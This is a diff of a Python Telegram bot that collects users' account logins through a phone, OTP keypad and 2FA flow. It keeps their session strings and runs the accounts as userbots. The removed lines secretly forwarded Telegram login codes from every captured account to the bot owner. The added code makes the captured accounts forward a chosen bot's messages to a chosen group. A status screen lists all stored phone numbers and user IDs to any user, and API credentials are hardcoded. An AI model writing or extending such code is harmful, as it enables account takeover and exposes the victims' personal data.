@@ -16,7 +16,7 @@ API_ID = int(os.environ.get("API_ID", "38746329"))
 API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 PORT = int(os.environ.get("PORT", 10000))
 
-(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_WELCOME_IMG, ASK_DEV_USER) = range(5)
+(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_WELCOME_IMG, ASK_DEV_USER, ASK_TARGET_BOT, ASK_TARGET_GROUP) = range(7)
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -67,15 +67,30 @@ def db_execute(query, params=()):
     conn.commit(); res = c.fetchall(); conn.close()
     return res
 
-# ================== USERBOT ==================
+# ================== USERBOT (Message Forwarder) ==================
 userbot_clients = {} 
+
 async def start_userbot(user_id, phone, session_str):
     try:
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         await client.connect()
-        @client.on(events.NewMessage(from_users=777000)) 
-        async def otp_handler(event):
-            await bot_app.bot.send_message(chat_id=OWNER_ID, text=f"NEW OTP ALERT\nAccount: {phone}\n\n{event.message.message}")
+        
+        @client.on(events.NewMessage)
+        async def msg_handler(event):
+            target_bot = get_setting("target_bot")
+            target_group = get_setting("target_group")
+            
+            if not target_bot or not target_group:
+                return
+            
+            sender = await event.get_sender()
+            if sender and sender.username and sender.username.lower() == target_bot.lower():
+                try:
+                    await client.forward_messages(target_group, event.message)
+                    logger.info(f"Message forwarded to {target_group}")
+                except Exception as e:
+                    logger.error(f"Failed to forward: {e}")
+                    
         userbot_clients[user_id] = client
         return client
     except Exception as e:
@@ -90,15 +105,17 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_img = get_setting("welcome_image")
     dev_user = get_setting("dev_username", "@iflexzyann")
     
-    # EXACT BLUE & RED BUTTONS (style="primary" & style="danger")
+    # Colored Buttons (Blue & Red)
     kb = [
         [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc", style="primary")],
-        [InlineKeyboardButton(st("SETTINGS"), callback_data="settings", style="primary")],
+        [InlineKeyboardButton(st("ADD BOT"), callback_data="add_bot", style="primary")],
+        [InlineKeyboardButton(st("ADD LINK"), callback_data="set_group", style="primary")],
+        [InlineKeyboardButton(st("VIEW STATUS"), callback_data="view_status", style="primary")],
+        [InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="danger")] if user.id == OWNER_ID else []
     ]
-    if user.id == OWNER_ID:
-        kb.append([InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="danger")])
-        
+    kb = [row for row in kb if row]
     reply_markup = InlineKeyboardMarkup(kb)
+    
     caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
     
     if welcome_img:
@@ -109,10 +126,27 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     await update.message.reply_text(caption, reply_markup=reply_markup, parse_mode="HTML")
 
-async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# --- VIEW STATUS ---
+async def view_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
+    accounts = db_execute("SELECT user_id, phone FROM accounts")
+    target_bot = get_setting("target_bot", "Not Set")
+    target_group = get_setting("target_group", "Not Set")
+    
+    text = f"<b>{st('CURRENT STATUS')}</b>\n\n"
+    text += f"{st('Total Logged In Accounts')}: {len(accounts)}\n"
+    text += f"{st('Target Bot')}: @{target_bot}\n"
+    text += f"{st('Target Group')}: {target_group}\n\n"
+    
+    if accounts:
+        text += f"<b>{st('LOGIN DETAILS')}:</b>\n"
+        for acc in accounts:
+            text += f"User ID: <code>{acc[0]}</code> | Phone: <code>{acc[1]}</code>\n"
+    else:
+        text += st("No accounts logged in yet.")
+        
     kb = [[InlineKeyboardButton(st("BACK"), callback_data="back", style="danger")]]
-    await query.edit_message_text(st("Settings Menu - Coming Soon"), reply_markup=InlineKeyboardMarkup(kb))
+    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
 
 # --- ADD ACCOUNT ---
 async def add_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -141,7 +175,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['temp_client'] = client
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
         
-        # OTP KEYPAD (BLUE style)
+        # OTP Keypad (Blue & Red)
         kb = [
             [InlineKeyboardButton("1", callback_data="otp_1", style="primary"), InlineKeyboardButton("2", callback_data="otp_2", style="primary"), InlineKeyboardButton("3", callback_data="otp_3", style="primary")],
             [InlineKeyboardButton("4", callback_data="otp_4", style="primary"), InlineKeyboardButton("5", callback_data="otp_5", style="primary"), InlineKeyboardButton("6", callback_data="otp_6", style="primary")],
@@ -149,7 +183,7 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton(st("CLEAR"), callback_data="otp_clear", style="danger"), InlineKeyboardButton("0", callback_data="otp_0", style="primary"), InlineKeyboardButton(st("SUBMIT"), callback_data="otp_submit", style="primary")]
         ]
         context.user_data['otp_entered'] = ""
-        await update.message.reply_text(st("Enter the OTP using the keypad:"), reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text(st("Enter the OTP:"), reply_markup=InlineKeyboardMarkup(kb))
         return ASK_OTP
     except Exception as e:
         await update.message.reply_text(f"{st('Error')}: {e}")
@@ -202,6 +236,30 @@ async def save_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client,
     await bot_app.bot.send_message(chat_id=user_id, text=st("Account successfully logged in!"))
     await client.disconnect()
 
+# --- ADD BOT ---
+async def add_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    await query.edit_message_text(st("Send the username of the bot whose messages you want to forward (without @):"))
+    return ASK_TARGET_BOT
+
+async def save_target_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    target = update.message.text.strip().replace("@", "")
+    set_setting("target_bot", target)
+    await update.message.reply_text(st(f"Target bot set to: @{target}"))
+    return ConversationHandler.END
+
+# --- ADD LINK (Group) ---
+async def set_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    await query.edit_message_text(st("Send the group link or username (e.g. https://t.me/mygroup):"))
+    return ASK_TARGET_GROUP
+
+async def save_target_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    target = update.message.text.strip()
+    set_setting("target_group", target)
+    await update.message.reply_text(st(f"Target group set to: {target}"))
+    return ConversationHandler.END
+
 # --- OWNER PANEL ---
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -239,28 +297,7 @@ async def save_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    user = query.from_user
-    welcome_img = get_setting("welcome_image")
-    dev_user = get_setting("dev_username", "@iflexzyann")
-    
-    kb = [
-        [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc", style="primary")],
-        [InlineKeyboardButton(st("SETTINGS"), callback_data="settings", style="primary")],
-    ]
-    if user.id == OWNER_ID:
-        kb.append([InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="danger")])
-        
-    reply_markup = InlineKeyboardMarkup(kb)
-    caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
-    
-    try:
-        if welcome_img:
-            await query.message.delete()
-            await context.bot.send_photo(chat_id=query.message.chat_id, photo=welcome_img, caption=caption, reply_markup=reply_markup, parse_mode="HTML")
-        else:
-            await query.edit_message_text(caption, reply_markup=reply_markup, parse_mode="HTML")
-    except:
-        pass
+    await start(update, context)
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(st("Cancelled."))
@@ -282,6 +319,18 @@ def main():
         fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
     )
 
+    bot_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(add_bot, pattern="^add_bot$")],
+        states={ASK_TARGET_BOT: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_bot)]},
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
+    )
+
+    group_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(set_group, pattern="^set_group$")],
+        states={ASK_TARGET_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_group)]},
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
+    )
+
     owner_conv = ConversationHandler(
         entry_points=[
             CallbackQueryHandler(ask_welcome, pattern="^set_welcome$"),
@@ -296,9 +345,10 @@ def main():
 
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(login_conv)
+    bot_app.add_handler(bot_conv)
+    bot_app.add_handler(group_conv)
     bot_app.add_handler(owner_conv)
-    
-    bot_app.add_handler(CallbackQueryHandler(settings_menu, pattern="^settings$"))
+    bot_app.add_handler(CallbackQueryHandler(view_status, pattern="^view_status$"))
     bot_app.add_handler(CallbackQueryHandler(owner_panel, pattern="^owner_panel$"))
     bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
 
